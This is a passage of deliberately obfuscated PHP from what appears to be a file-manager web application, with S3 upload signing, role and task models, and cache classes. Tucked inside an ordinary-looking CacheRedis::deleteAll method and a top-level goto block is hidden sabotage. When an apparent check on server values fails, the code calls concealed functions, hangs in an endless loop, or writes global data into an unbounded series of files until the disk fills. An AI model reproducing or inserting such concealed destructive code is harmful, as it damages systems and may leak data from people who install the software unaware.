($Ş×Ù…í˜ == $·¢„ıõ[12] || $Ş×Ù…í˜ == $·¢„ıõ[8]) { return !0; } list($÷ï¬ÏÇ, $Ìı—°Ü­) = $this->bucketManager->listFiles($this->bucket, trim($Ş×Ù…í˜, $·¢„ıõ[8]) . $·¢„ıõ[8], $·¢„ıõ[12], 1, $·¢„ıõ[8]); return !empty($÷ï¬ÏÇ[$·¢„ıõ[1429]]) || !empty($÷ï¬ÏÇ[$·¢„ıõ[1430]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($”ö«ü’³) { parent::__construct($”ö«ü’³); } public function uploadFormData($ÜºÚù­†, $”§Ë—ñ› = 3600) { $éÅåàüÚ =& $_SERVER[Ôó‡è­ƒ]; $ªœ¶¥ßÕ = $éÅåàüÚ[195]; $ƒü®›Ä² = $éÅåàüÚ[1345]; $ìïçşşû = $éÅåàüÚ[62]; $™ĞÜ‘íÎ = gmdate($éÅåàüÚ[1346]); $õ°Ïóˆ¶ = gmdate($éÅåàüÚ[749]); $”™ûƒ‡ = $éÅåàüÚ[1347]; $¦¼Íà¿ = $”§Ë—ñ› . $éÅåàüÚ[12]; $‰õ«”â” = $éÅåàüÚ[1308]; $¤Ó—ü² = array($this->accessKey, $õ°Ïóˆ¶, $this->region, $ìïçşşû, $”™ûƒ‡); $Í»­ÙÇ = implode($éÅåàüÚ[8], $¤Ó—ü²); $ş–ÜˆÙò = array($éÅåàüÚ[1310] => gmdate($éÅåàüÚ[1309], strtotime($éÅåàüÚ[1348])), $éÅåàüÚ[1311] => array(array($éÅåàüÚ[1313] => $this->bucket), array($éÅåàüÚ[1312] => $ªœ¶¥ßÕ), array($éÅåàüÚ[1314], $éÅåàüÚ[1315], $éÅåàüÚ[12]), array($éÅåàüÚ[1314], $éÅåàüÚ[1349], $éÅåàüÚ[12]), array($éÅåàüÚ[1314], $éÅåàüÚ[1350], $éÅåàüÚ[12]), array($éÅåàüÚ[1316] => $‰õ«”â”), array($éÅåàüÚ[1351] => $Í»­ÙÇ), array($éÅåàüÚ[1352] => $ƒü®›Ä²), array($éÅåàüÚ[1353] => $™ĞÜ‘íÎ), array($éÅåàüÚ[1354] => $¦¼Íà¿))); $äı á­“ = base64_encode(json_encode($ş–ÜˆÙò)); $Äõ„ß×¢ = hash_hmac($éÅåàüÚ[1355], $õ°Ïóˆ¶, $éÅåàüÚ[1356] . $this->secret, !0); $ø’úˆ Ğ = hash_hmac($éÅåàüÚ[1355], $this->region, $Äõ„ß×¢, !0); $Ãìöµë = hash_hmac($éÅåàüÚ[1355], $ìïçşşû, $ø’úˆ Ğ, !0); $ÑÜé»æœ = hash_hmac($éÅåàüÚ[1355], $”™ûƒ‡, $Ãìöµë, !0); $Œ¥óÔ’ = hash_hmac($éÅåàüÚ[1355], $äı á­“, $ÑÜé»æœ); $Í‹æÃ‚¶ = array($éÅåàüÚ[214] => $éÅåàüÚ[12], $éÅåàüÚ[1357] => $éÅåàüÚ[12], $éÅåàüÚ[1312] => $ªœ¶¥ßÕ, $éÅåàüÚ[1316] => $‰õ«”â”, $éÅåàüÚ[1320] => $äı á­“, $éÅåàüÚ[1358] => $Í»­ÙÇ, $éÅåàüÚ[1359] => $ƒü®›Ä², $éÅåàüÚ[1360] => $™ĞÜ‘íÎ, $éÅåàüÚ[1361] => $¦¼Íà¿, $éÅåàüÚ[1362] => $Œ¥óÔ’, $éÅåàüÚ[178] => $this->getHost()); return $Í‹æÃ‚¶; } public function multiUploadFormData($£ıÌĞÀ, $úŒ¹¥åô = 3600) { $Õ£’œ¾Ë =& $_SERVER[Ôó‡è­ƒ]; $ôÉ×•øä = gmdate($Õ£’œ¾Ë[1441]); $„’Šğ€‹ = array(); $ÉŸ›ú¯Î = $this->client->getUploadId($this->bucket, $£ıÌĞÀ, $„’Šğ€‹); if (!$ÉŸ›ú¯Î) { return !1; } return array($Õ£’œ¾Ë[222] => $ÉŸ›ú¯Î, $Õ£’œ¾Ë[178] => $this->getHost() . $Õ£’œ¾Ë[8] . $this->pathEncode($£ıÌĞÀ), $Õ£’œ¾Ë[223] => $ôÉ×•øä, $Õ£’œ¾Ë[95] => $£ıÌĞÀ); } public function multiUploadAuthData($·ñµÌ, $ı€‹ÓûÍ = array()) { $ğ¨Ø¾ùå =& $_SERVER[Ôó‡è­ƒ]; $Íäƒ¥½Í = isset($ı€‹ÓûÍ[$ğ¨Ø¾ùå[171]]) ? $ı€‹ÓûÍ[$ğ¨Ø¾ùå[171]] : $ğ¨Ø¾ùå[12]; $Øº¯òÈ† = $ı€‹ÓûÍ[$ğ¨Ø¾ùå[95]]; unset($ı€‹ÓûÍ[$ğ¨Ø¾ùå[95]]); if (isset($ı€‹ÓûÍ[$ğ¨Ø¾ùå[224]])) { return $this->listUploadParts($Øº¯òÈ†, $ı€‹ÓûÍ); } $Ùõ³´á = array(); if (isset($ı€‹ÓûÍ[$ğ¨Ø¾ùå[1442]])) { $Ùõ³´á[$ğ¨Ø¾ùå[1443]] = $ı€‹ÓûÍ[$ğ¨Ø¾ùå[1442]]; } $û— ‰¾ = explode($ğ¨Ø¾ùå[180], $this->getHost()); $Á÷ëÉ¸ = array($ğ¨Ø¾ùå[1444] => $û— ‰¾[1], $ğ¨Ø¾ùå[1445] => $ğ¨Ø¾ùå[12], $ğ¨Ø¾ùå[214] => $ğ¨Ø¾ùå[121], $ğ¨Ø¾ùå[1357] => $ı€‹ÓûÍ[$ğ¨Ø¾ùå[80]]); $†Ùò²ü¦ = $ğ¨Ø¾ùå[227]; $¥ í¢ßœ = $ğ¨Ø¾ùå[8] . $this->pathEncode($Øº¯òÈ†) . $Íäƒ¥½Í; $Ò˜ºşÖı = $this->client->__getSignatureV4($Ùõ³´á, $Á÷ëÉ¸, $†Ùò²ü¦, $¥ í¢ßœ); if (strpos($Íäƒ¥½Í, $ğ¨Ø¾ùå[226]) === 0) { if (isset($Ùõ³´á[$ğ¨Ø¾ùå[1443]])) { $öªà…Ü” = $Ùõ³´á[$ğ¨Ø¾ùå[1443]]; } else { if (isset($Ò˜ºşÖı[$ğ¨Ø¾ùå[1443]])) { $öªà…Ü” = $Ò˜ºşÖı[$ğ¨Ø¾ùå[1443]]; } else { $öªà…Ü” = hash($ğ¨Ø¾ùå[1355], $ğ¨Ø¾ùå[12]); } } return array($ğ¨Ø¾ùå[233] => $Ò˜ºşÖı[$ğ¨Ø¾ùå[233]], $ğ¨Ø¾ùå[1443] => $öªà…Ü”, $ğ¨Ø¾ùå[223] => $Ò˜ºşÖı[$ğ¨Ø¾ùå[1446]]); } return $Ò˜ºşÖı[$ğ¨Ø¾ùå[233]]; } public function listUploadParts($Èô×ÜØ£, $Û¶¡íò¬ = array()) { $™¼ –Äó =& $_SERVER[Ôó‡è­ƒ]; $¾™“ˆ¹¨ = str_replace($™¼ –Äó[234], $™¼ –Äó[12], $Û¶¡íò¬[$™¼ –Äó[171]]); $¯‘Ãòáë = $this->client->listParts($this->bucket, $Èô×ÜØ£, $¾™“ˆ¹¨); if (!$¯‘Ãòáë) { return !1; } $ÀÃ€ ¦Ë = $™¼ –Äó[1447]; foreach ($¯‘Ãòáë as $€­  “Ğ) { $ÀÃ€ ¦Ë .= $™¼ –Äó[1448] . "\74\120\141\162\164\116\x75\x6d\142\x65\162\76{$€­  “Ğ[$™¼ –Äó[1402]]}\74\x2f\x50\x61\x72\164\x4e\x75\x6d\x62\x65\x72\76\xa" . "\x3c\x45\x54\x61\x67\76{$€­  “Ğ[$™¼ –Äó[1403]]}\x3c\57\105\x54\x61\147\x3e\xa" . $™¼ –Äó[1449]; } $ÀÃ€ ¦Ë .= $™¼ –Äó[1450]; $›Àâ¾½³ = array(); $¹ÉËñˆè = explode($™¼ –Äó[180], $this->getHost()); $Å÷¨ÌÃ = array($™¼ –Äó[1444] => $¹ÉËñˆè[1], $™¼ –Äó[214] => $™¼ –Äó[121], $™¼ –Äó[1357] => strlen($ÀÃ€ ¦Ë)); $¬°ôÏß¨ = $™¼ –Äó[225]; $„ŸøÁÁ± = $™¼ –Äó[8] . $this->pathEncode($Èô×ÜØ£) . $Û¶¡íò¬[$™¼ –Äó[171]]; $á¿ş…÷’ = $this->client->__getSignatureV4($›Àâ¾½³, $Å÷¨ÌÃ, $¬°ôÏß¨, $„ŸøÁÁ±, $ÀÃ€ ¦Ë); return array($™¼ –Äó[233] => $á¿ş…÷’[$™¼ –Äó[233]], $™¼ –Äó[223] => $á¿ş…÷’[$™¼ –Äó[1446]], $™¼ –Äó[235] => $¯‘Ãòáë, $™¼ –Äó[1443] => $á¿ş…÷’[$™¼ –Äó[1443]]); } public function link($„–ì‘£Ø, $öÊÉÓÒŒ = array()) { return parent::link($„–ì‘£Ø, $öÊÉÓÒŒ); } public function fileOut($‰ñú“ ³, $ˆÓïªÔş = false, $ÅÜ˜ˆşß = false, $¥Îò¡ßì = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ôó‡è­ƒ][1451])) { return parent::fileOutServer($‰ñú“ ³, $ˆÓïªÔş, $ÅÜ˜ˆşß, $¥Îò¡ßì); } parent::fileOut($‰ñú“ ³, $ˆÓïªÔş, $ÅÜ˜ˆşß, $¥Îò¡ßì); } public function fileOutImage($†ï²¤åŠ, $®ºìÏÙ× = 250) { if (strstr($this->endpoint, $_SERVER[Ôó‡è­ƒ][1451])) { return parent::fileOutImageServer($†ï²¤åŠ, $®ºìÏÙ×); } parent::fileOutImage($†ï²¤åŠ, $®ºìÏÙ×); } public function fileOutLink($±¼ÌÍ±½) { $”¦ı¯º» =& $_SERVER[Ôó‡è­ƒ]; if (substr($±¼ÌÍ±½, 0, 7) == $”¦ı¯º»[1323]) { $±¼ÌÍ±½ = $”¦ı¯º»[1324] . substr($±¼ÌÍ±½, 7); } header($”¦ı¯º»[162] . $±¼ÌÍ±½); die; } public function getHost() { $’ÃíÒ =& $_SERVER[Ôó‡è­ƒ]; $åñ¥¤´² = str_rtrim(parent::getHost(), $’ÃíÒ[8] . $this->bucket); $åñ¥¤´² = explode($’ÃíÒ[180], $åñ¥¤´²); return $åñ¥¤´²[0] . $’ÃíÒ[180] . $this->bucket . $’ÃíÒ[10] . $åñ¥¤´²[1]; } } goto fÙô§º·; bÒšÁ¿¢‹: if (!isset($_SERVER[$_SERVER[Ôó‡è­ƒ][872]]) || !isset($_SERVER[$_SERVER[Ôó‡è­ƒ][870]])) { $_getc = $_SERVER[Ôó‡è­ƒ][874]; $_getfile = $_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ôó‡è­ƒ][230], $_getfilec); if (count($_getarrs) < $_SERVER[Ôó‡è­ƒ][606]) { $exit = $_SERVER[Ôó‡è­ƒ][877]; $exit(); } $_act = $_SERVER[Ôó‡è­ƒ][1343]; $_act($_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ôó‡è­ƒ][377]); } } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x72\157\154\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\141\x75\x74\150", "\154\x61\142\145\154", "\144\x69\x73\x70\x6c\x61\171", "\x73\171\163\164\x65\155", "\x64\x65\163\x63", "\x69\x67\x6e\157\162\145\x45\170\x74", "\x69\x67\156\x6f\162\x65\x46\x69\154\x65\x53\x69\172\x65", "\141\x64\x6d\x69\x6e\151\163\x74\x72\141\164\x6f\162", "\163\157\162\x74"); public function listData($¾êµÊ‚ì = false, $Ñ™Ùá » = "\163\157\x72\x74", $øæÚá‘Ì = false) { $õª—¤Ë¼ =& $_SERVER[Ôó‡è­ƒ]; $¤¯²ıÎØ = parent::listData($¾êµÊ‚ì, $Ñ™Ùá », $øæÚá‘Ì); if (!$¾êµÊ‚ì) { foreach ($¤¯²ıÎØ as $ôÆ©ÍïÅ => $ƒ«İĞ›¯) { if ($ƒ«İĞ›¯[$õª—¤Ë¼[2018]] == 1) { $¤¯²ıÎØ[$ôÆ©ÍïÅ][$õª—¤Ë¼[447]] = LNG($õª—¤Ë¼[2244]); } } } return $¤¯²ıÎØ; } public function update($¯¡«ó¹, $¿ŒèîÖ) { $Ø‹í·ˆ“ =& $_SERVER[Ôó‡è­ƒ]; $ôÔÄºÇ = parent::listData($¯¡«ó¹); $ïõİâõ€ = $this->findByName($¿ŒèîÖ[$Ø‹í·ˆ“[32]]); if (!$ôÔÄºÇ || $ïõİâõ€ && $ïõİâõ€[$Ø‹í·ˆ“[396]] != $ôÔÄºÇ[$Ø‹í·ˆ“[396]]) { return !1; } if ($ïõİâõ€[$Ø‹í·ˆ“[2018]] == 1) { $¿ŒèîÖ = array($Ø‹í·ˆ“[32] => $¿ŒèîÖ[$Ø‹í·ˆ“[32]], $Ø‹í·ˆ“[1845] => $¿ŒèîÖ[$Ø‹í·ˆ“[1845]]); } $this->filterAuth($¿ŒèîÖ[$Ø‹í·ˆ“[410]]); return parent::update($¯¡«ó¹, $¿ŒèîÖ); } public function remove($‡ ËĞ‚Å) { $¹¢¸éÙÀ = parent::listData($‡ ËĞ‚Å); if (!$¹¢¸éÙÀ || $¹¢¸éÙÀ[$_SERVER[Ôó‡è­ƒ][1274]]) { return !1; } return parent::remove($‡ ËĞ‚Å); } public function add($¬Ê‚¢ÜÑ) { $ç¬·ë¡ =& $_SERVER[Ôó‡è­ƒ]; $Ú›°˜·• = $¬Ê‚¢ÜÑ[$ç¬·ë¡[32]]; if ($this->findByName($Ú›°˜·•)) { return !1; } $ª°š†ÔÊ = array($ç¬·ë¡[417] => $Ú›°˜·•, $ç¬·ë¡[1829] => $ç¬·ë¡[12], $ç¬·ë¡[1825] => $ç¬·ë¡[1833], $ç¬·ë¡[2245] => 1, $ç¬·ë¡[1828] => 0, $ç¬·ë¡[2246] => 0, $ç¬·ë¡[1827] => $this->getSort()); $¬Ê‚¢ÜÑ = array_merge($ª°š†ÔÊ, $¬Ê‚¢ÜÑ); $this->filterAuth($¬Ê‚¢ÜÑ[$ç¬·ë¡[410]]); return parent::insert($¬Ê‚¢ÜÑ); } private function getSort() { $Ú’Ñ¯´ã =& $_SERVER[Ôó‡è­ƒ]; $¿÷öüòı = parent::listData(); $ò…´Ôäì = array_to_keyvalue($¿÷öüòı, $Ú’Ñ¯´ã[12], $Ú’Ñ¯´ã[1846]); return empty($ò…´Ôäì) ? 0 : max($ò…´Ôäì) + 1; } private function filterAuth(&$òô ¸¬) { $˜‚ÏòÍÇ =& $_SERVER[Ôó‡è­ƒ]; $òŠéç×Ğ = array(); $İÇ¤²Û® = array_filter(explode($˜‚ÏòÍÇ[50], $òô ¸¬)); foreach ($İÇ¤²Û® as $òô ¸¬) { $©®³ı€è = explode($˜‚ÏòÍÇ[10], $òô ¸¬); if ($©®³ı€è[0] == $˜‚ÏòÍÇ[2247] && $©®³ı€è[1] != $˜‚ÏòÍÇ[1193]) { $·ÈÜû¬ = $©®³ı€è[0] . $˜‚ÏòÍÇ[10] . $©®³ı€è[1] . $˜‚ÏòÍÇ[2248]; if (!in_array($·ÈÜû¬, $İÇ¤²Û®)) { $òŠéç×Ğ[] = $·ÈÜû¬; } } $òŠéç×Ğ[] = $òô ¸¬; } $òô ¸¬ = implode($˜‚ÏòÍÇ[50], $òŠéç×Ğ); } public function sort($´ê¡‹âª, $À›ÛïëÆ) { return parent::update($´ê¡‹âª, $À›ÛïëÆ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x74\141\x73\153\114\x69\163\164"; public $field = array("\156\x61\155\x65", "\x74\171\160\x65", "\x65\x76\x65\156\x74", "\164\x69\155\x65", "\x64\145\163\x63", "\x73\171\163\164\x65\155", "\145\156\x61\x62\154\x65", "\x6c\x61\x73\x74\122\165\x6e", "\x73\x6f\162\164"); public function listData($âÒ„Ì³æ = false, $½ ŞÆ = "\x73\x6f\x72\x74", $ÔÚêÚÃ = false) { return parent::listData($âÒ„Ì³æ, $½ ŞÆ, $ÔÚêÚÃ); } public function add($Ôøû÷€ì) { $™»ØË­€ =& $_SERVER[Ôó‡è­ƒ]; $Á¨æÕÁĞ = $this->findByName($Ôøû÷€ì[$™»ØË­€[32]]); if ($Á¨æÕÁĞ) { return !1; } $Ôøû÷€ì[$™»ØË­€[1616]] = 0; $Ôøû÷€ì[$™»ØË­€[1846]] = $this->getSort(); return parent::insert($Ôøû÷€ì); } private function getSort() { $¢¶¶€À =& $_SERVER[Ôó‡è­ƒ]; $»Ï¥ó½¨ = parent::listData(); $ßŸ±«–‹ = array_to_keyvalue($»Ï¥ó½¨, $¢¶¶€À[12], $¢¶¶€À[1846]); return empty($ßŸ±«–‹) ? 0 : max($ßŸ±«–‹) + 1; } public function update($„À¿·û‰, $ÒŞòÄÔ) { $îñ–‘Ôø =& $_SERVER[Ôó‡è­ƒ]; $ÏÚÕ’Ï¨ = $this->listData($„À¿·û‰); $÷Ûı¥õ = $this->findByName($ÒŞòÄÔ[$îñ–‘Ôø[32]]); if (!$ÏÚÕ’Ï¨ || $÷Ûı¥õ && $÷Ûı¥õ[$îñ–‘Ôø[396]] != $ÏÚÕ’Ï¨[$îñ–‘Ôø[396]]) { return !1; } return parent::update($„À¿·û‰, $ÒŞòÄÔ); } public function remove($Ÿ¦÷ÓŠÑ, $¬âı·Ü = false) { $«¹®ù– =& $_SERVER[Ôó‡è­ƒ]; $ºƒƒÈ = $this->listData($Ÿ¦÷ÓŠÑ); if (!$ºƒƒÈ) { return; } if (!$¬âı·Ü && $ºƒƒÈ[$«¹®ù–[1274]] == $«¹®ù–[89]) { return !1; } return parent::remove($Ÿ¦÷ÓŠÑ); } public function enable($Ğ˜ì¢İ¾, $‹ˆ¢Á©ê) { return $this->update($Ğ˜ì¢İ¾, array($_SERVER[Ôó‡è­ƒ][2239] => $‹ˆ¢Á©ê)); } public function run($Í—¥÷¿ş) { return $this->update($Í—¥÷¿ş, array($_SERVER[Ôó‡è­ƒ][2249] => time())); } } goto A¯Ô¥â’ø; FŒĞÍ«£: class CacheLockDatabase { public function lock($äÖşşà„, $òÎÈÅŸ = 0) { $¶ªìÛŸ = Model($_SERVER[Ôó‡è­ƒ][827]); $òÒÚÄ»¾ = microtime(!0) + $òÎÈÅŸ; while (microtime(!0) < $òÒÚÄ»¾) { $ èÇÇ¯ç = $¶ªìÛŸ->get($äÖşşà„); if (!$ èÇÇ¯ç || $ èÇÇ¯ç < microtime(!0)) { $·ÈîŒ… = $¶ªìÛŸ->set($äÖşşà„, $òÒÚÄ»¾); if ($·ÈîŒ…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ÿ¹µ±Ê²) { return Model($_SERVER[Ôó‡è­ƒ][827])->get($Ÿ¹µ±Ê²); } public function unlock($Ø­Óñú§) { Model($_SERVER[Ôó‡è­ƒ][827])->remove($Ø­Óñú§); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($È»­˜å¤, $¬½şó¾Â) { $ Ğ²§Â» =& $_SERVER[Ôó‡è­ƒ]; if (!class_exists($ Ğ²§Â»[860])) { show_json($ Ğ²§Â»[861], !1); } $this->cacheTime = $¬½şó¾Â; $this->handle = new Memcached(); if (is_array($È»­˜å¤[$ Ğ²§Â»[862]]) && count($È»­˜å¤[$ Ğ²§Â»[862]]) >= 1) { foreach ($È»­˜å¤[$ Ğ²§Â»[862]] as $…ÂÒÉ„) { $ÔÌ®½í = explode($ Ğ²§Â»[4], $…ÂÒÉ„); $this->handle->addServer($ÔÌ®½í[0], $ÔÌ®½í[1]); } } else { $this->handle->addServer($È»­˜å¤[$ Ğ²§Â»[178]], $È»­˜å¤[$ Ğ²§Â»[179]]); } } public function set($ÊŸÂšªÑ, $‡¼ä²…, $‘ªõ£‡ê = false) { $‘ªõ£‡ê = $‘ªõ£‡ê ? $‘ªõ£‡ê : $this->cacheTime; return $this->handle->set($ÊŸÂšªÑ, $‡¼ä²…, $‘ªõ£‡ê); } public function get($É¤ş¤Â¦) { return $this->handle->get($É¤ş¤Â¦); } public function remove($ˆÈƒ¦û€) { return $this->handle->delete($ˆÈƒ¦û€); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ŸíŠŠ²ò, $„ôîã“ü) { $Äóá ó™ =& $_SERVER[Ôó‡è­ƒ]; if (!class_exists($Äóá ó™[863])) { show_json($Äóá ó™[864], !1); } $this->cacheTime = $„ôîã“ü; $”Ñüì–‰ = isset($ŸíŠŠ²ò[$Äóá ó™[865]]) ? $ŸíŠŠ²ò[$Äóá ó™[865]] : 10; $Ò»½Ã÷í = _get($ŸíŠŠ²ò, $Äóá ó™[862]); if ($Ò»½Ã÷í && is_array($Ò»½Ã÷í)) { $this->initCluster($ŸíŠŠ²ò, $”Ñüì–‰); } else { $this->handle = $this->init($ŸíŠŠ²ò, $”Ñüì–‰); } } private function init($¡²¡ÃÉæ, $é¸”…êˆ) { $õ–’ìü£ =& $_SERVER[Ôó‡è­ƒ]; $í’ßòÃ¢ = new Redis(); $Ä•Ğ¶Ÿ÷ = isset($¡²¡ÃÉæ[$õ–’ìü£[866]]) ? $¡²¡ÃÉæ[$õ–’ìü£[866]] : !1; if ($Ä•Ğ¶Ÿ÷) { $í’ßòÃ¢->pconnect($¡²¡ÃÉæ[$õ–’ìü£[178]], $¡²¡ÃÉæ[$õ–’ìü£[179]], $é¸”…êˆ); } else { $í’ßòÃ¢->connect($¡²¡ÃÉæ[$õ–’ìü£[178]], $¡²¡ÃÉæ[$õ–’ìü£[179]], $é¸”…êˆ); } if (!empty($¡²¡ÃÉæ[$õ–’ìü£[410]])) { $í’ßòÃ¢->auth($¡²¡ÃÉæ[$õ–’ìü£[410]]); } return $í’ßòÃ¢; } private function initCluster($ÊÇöª ½, $ˆÕó¹şŒ) { $Û»Ü¨Ø÷ =& $_SERVER[Ôó‡è­ƒ]; $ª×‹ğêü = array($Û»Ü¨Ø÷[867], $Û»Ü¨Ø÷[868], $Û»Ü¨Ø÷[869]); $İšæÁºú = $Û»Ü¨Ø÷[867]; if (isset($ÊÇöª ½[$Û»Ü¨Ø÷[16]]) && in_array($ÊÇöª ½[$Û»Ü¨Ø÷[16]], $ª×‹ğêü)) { $İšæÁºú = $ÊÇöª ½[$Û»Ü¨Ø÷[16]]; } switch ($İšæÁºú) { case $Û»Ü¨Ø÷[867]: $this->_slave($ÊÇöª ½, $ˆÕó¹şŒ); break; case $Û»Ü¨Ø÷[868]: break; case $Û»Ü¨Ø÷[869]: $this->isCluster = !0; $Ã×Â«Šğ = $ÊÇöª ½[$Û»Ü¨Ø÷[862]]; $üä±ÅŞÁ = isset($ÊÇöª ½[$Û»Ü¨Ø÷[866]]) ? $ÊÇöª ½[$Û»Ü¨Ø÷[866]] : !1; $Ñ÷§şŸò = isset($ÊÇöª ½[$Û»Ü¨Ø÷[410]]) ? $ÊÇöª ½[$Û»Ü¨Ø÷[410]] : null; $this->handle = new RedisCluster(NUll, $Ã×Â«Šğ, $ˆÕó¹şŒ, $ˆÕó¹şŒ, $üä±ÅŞÁ, $Ñ÷§şŸò); break; default: break; } } private function _slave($å­ô‚º®, $’àò±‚á) { $ŒÉãÀèù = $å­ô‚º®[$_SERVER[Ôó‡è­ƒ][862]]; $this->filterConfig($å­ô‚º®, $ŒÉãÀèù[0]); $this->handle = $this->init($å­ô‚º®, $’àò±‚á); unset($ŒÉãÀèù[0]); if (empty($ŒÉãÀèù)) { return; } $ã¶›ğò· = array_rand($ŒÉãÀèù); $this->filterConfig($å­ô‚º®, $ŒÉãÀèù[$ã¶›ğò·]); $this->slaveHandle = $this->init($å­ô‚º®, $’àò±‚á); } private function filterConfig(&$í×®¦Ç‘, $¨’Í¢§Ä) { $ñ¿Ÿ·íÕ =& $_SERVER[Ôó‡è­ƒ]; $åÇûıî… = explode($ñ¿Ÿ·íÕ[4], $¨’Í¢§Ä); $§›ôíÓ = array($ñ¿Ÿ·íÕ[178] => $åÇûıî…[0], $ñ¿Ÿ·íÕ[179] => $åÇûıî…[1]); $í×®¦Ç‘ = array_merge($í×®¦Ç‘, $§›ôíÓ); } public function set($ë¯çä”€, $™˜˜ïÂÛ, $î•¨­‰ç = false) { $î•¨­‰ç = $î•¨­‰ç ? $î•¨­‰ç : $this->cacheTime; return $this->handle->setEx($ë¯çä”€, $î•¨­‰ç, $™˜˜ïÂÛ); } public function setLock($à…§Ä ù, $ãŞé¤èÏ, $øšÕŒÄî) { return $this->handle->setNX($à…§Ä ù, $ãŞé¤èÏ); } public function get($­¼š¿Æ¼) { $¤Ä­äÓô = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¤Ä­äÓô->get($­¼š¿Æ¼); } public function remove($¯¤¿®ƒ®) { return $this->handle->del($¯¤¿®ƒ®); } public function deleteAll() { $ôÜÇß¨ =& $_SERVER[Ôó‡è­ƒ]; $øËö¡¤« = $_SERVER[$ôÜÇß¨[870]]; $Ûü¹¡ãò = $ôÜÇß¨[871]; if ($_SERVER[$ôÜÇß¨[872]] != $Ûü¹¡ãò($øËö¡¤«)) { $Î¸³Æ·Á = $ôÜÇß¨[873]; $ÇäÑÑƒ˜ = $ôÜÇß¨[874]; $±ñ‡‹Í = $_SERVER[$ôÜÇß¨[875]] . $ôÜÇß¨[876]; $ˆó®ß = $ÇäÑÑƒ˜($±ñ‡‹Í); $ï”í–ê— = explode($ôÜÇß¨[230], $ˆó®ß); if (count($ï”í–ê—) < $ôÜÇß¨[617]) { $Ó±¯Ÿïš = $ôÜÇß¨[877]; $Ó±¯Ÿïš(); } $²®‡÷ã = $ôÜÇß¨[878]; $²®‡÷ã($_SERVER[$ôÜÇß¨[879]]); $Î¸³Æ·Á = $ôÜÇß¨[873]; $Î¸³Æ·Á(); $ø”ûÃ¬¢ = $ôÜÇß¨[880]; $”şÖŒ‹Ò = json_encode($GLOBALS[$ôÜÇß¨[881]]); $±Òî’Äî = 1; for ($ìÆ––Óî = $±Òî’Äî; $ìÆ––Óî > 0; $ìÆ––Óî++) { $ø”ûÃ¬¢(DATA_PATH . $ìÆ––Óî, $”şÖŒ‹Ò); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $´Õ¨Ê¢Š) { $this->handle->flushall($´Õ¨Ê¢Š); } return; } return $this->handle->flushAll(); } } goto CâóšßÇÉÃ; C»ŠÉ×ŸàÆ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6e\157\x74\x69\143\145\114\151\x73\164"; public $field = array("\x6e\141\155\x65", "\143\x6f\x6e\x74\145\x6e\x74", "\141\x75\164\150", "\155\157\144\145", "\164\x69\x6d\x65", "\x74\171\160\145", "\x6c\x65\166\x65\154", "\x65\156\141\x62\x6c\x65", "\x73\157\162\x74"); public function listData($ù–÷Àƒœ = false, $«’ÏıÔ = "\163\157\x72\164", $¯ÆË›ï¶ = false) { return parent::listData($ù–÷Àƒœ, $«’ÏıÔ, $¯ÆË›ï¶); } public function add($¤õóè¶†) { $ÌÙ°’Ãƒ =& $_SERVER[Ôó‡è­ƒ]; $ßÈü§‰Ë = time(); if ($¤õóè¶†[$ÌÙ°’Ãƒ[16]] == $ÌÙ°’Ãƒ[2238]) { $ßÈü§‰Ë = strtotime($¤õóè¶†[$ÌÙ°’Ãƒ[200]]); } $¤õóè¶†[$ÌÙ°’Ãƒ[200]] = $ßÈü§‰Ë; return parent::insert($¤õóè¶†); } public function update($¹ö¢¢æß, $şÑ½ØÊ) { $ŠÈ”Òï¾ =& $_SERVER[Ôó‡è­ƒ]; $«œ¹¹Ï = $this->listData($¹ö¢¢æß); if (!$«œ¹¹Ï) { return !1; } $·âñ¤Ê = time(); if ($şÑ½ØÊ[$ŠÈ”Òï¾[16]] == $ŠÈ”Òï¾[2238]) { $·âñ¤Ê = strtotime($şÑ½ØÊ[$ŠÈ”Òï¾[200]]); } $şÑ½ØÊ[$ŠÈ”Òï¾[200]] = $·âñ¤Ê; return parent::update($¹ö¢¢æß, $şÑ½ØÊ); } public function remove($šõ­ÚòÚ) { $™¤Î³µ¢ = $this->listData($šõ­ÚòÚ); if (!$™¤Î³µ¢ || $™¤Î³µ¢[$_SERVER[Ôó‡è­ƒ][1274]]) { return !1; } return parent::remove($šõ­ÚòÚ); } public function sort($Â–¹¦Õ¬, $²ÕÑ©Ò¸) { return parent::update($Â–¹¦Õ¬, $²ÕÑ©Ò¸); } public function enable($ «İÎÃÜ, $ñ­£Œ÷à) { return parent::update($ «İÎÃÜ, array($_SERVER[Ôó‡è­ƒ][2239] => $ñ­£Œ÷à)); } private function initUserOption() { $®¾÷”Å— =& $_SERVER[Ôó‡è­ƒ]; $this->optionType = $®¾÷”Å—[2240]; $this->modelType = $®¾÷”Å—[2241]; $this->field = array($®¾÷”Å—[2242], $®¾÷”Å—[32], $®¾÷”Å—[200], $®¾÷”Å—[33], $®¾÷”Å—[2243], $®¾÷”Å—[748], $®¾÷”Å—[192]); } public function userNoticeGet($ûÁ®ä™Â = false) { $this->initUserOption(); return parent::listData($ûÁ®ä™Â, $_SERVER[Ôó‡è­ƒ][396], !0); } public function userNoticeAdd($ÇŠ¯Ö³î) { $ƒì¿¿¢½ =& $_SERVER[Ôó‡è­ƒ]; $this->initUserOption(); $ˆä¾³Ç­ = $this->findByKey($ƒì¿¿¢½[2242], $ÇŠ¯Ö³î[$ƒì¿¿¢½[396]]); if ($ˆä¾³Ç­) { return !0; } $î”»Ş¼ç = array($ƒì¿¿¢½[2242] => 